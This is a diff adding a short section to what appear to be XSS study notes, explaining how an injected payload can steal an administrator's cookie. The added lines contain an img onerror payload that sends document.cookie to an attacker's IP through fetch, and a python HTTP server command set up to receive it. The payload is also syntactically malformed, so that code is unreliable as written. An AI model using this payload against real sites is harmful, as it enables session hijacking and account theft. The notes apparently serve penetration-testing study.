@@ -48,3 +48,12 @@ The code executes on the client side, within the user's browser. It doesn't rely
 
 If an attacker can inject this code into a web page by manipulating user-generated content (e.g., through input fields or URLs), the injected code will execute within the user's browser. For example, an attacker might craft a URL like `https://example.com/?input=javascript:alert(document.cookie)` and trick a user into clicking it.
 
+# Obtaining Cookie
+If we can introduce XSS code into a petition that will be processed by the administration server, we can try to obtain it's cookie by running the following code: 
+```bash
+<img src'x' onerror=fetch('http://<own-ip>/+document.cookie);>
+```
+With this petition we induce the victim server to execute JS code. With this code the server tries to execute  a wrong image and on the error sends it's cookie to our machine. Before executing this payload is necessary to open a local port.
+```bash
+pyton3 -m http.server 80
+```
